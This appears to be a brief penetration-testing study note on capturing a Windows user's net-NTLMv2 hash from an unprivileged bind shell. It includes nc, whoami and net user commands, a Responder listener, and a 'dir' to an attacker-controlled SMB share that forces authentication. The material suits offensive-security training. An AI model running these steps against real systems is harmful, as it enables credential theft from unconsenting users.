#### net-NTLMv2

sometimes we may gain access to a system as an unpriveleged user which means we cannot use tools like mimikatz

in this example we will assume we setup a bind shell on our target windows machine and connect to it 

    $ nc 192.168.50.50 4444

we can now check which user we are logged in as and what priveleges we have

    $ whoami

    $ net user ted

ted does not belong to the administrator group but does belong to the Remote Desktop Users group

because we do not have Admin privs we can not use mimikatz, but we can setup an smb server and use ted to attempt authentication
to capture his NTLM hash

    $ sudo responder -I tun0

next we want to provide an arbitrary share in order to catch ted's auth creds

if we visit our NC bind shell terminal to our first machine 

    C:\> dir \\192.168.119.2\test

in this example test does not exist
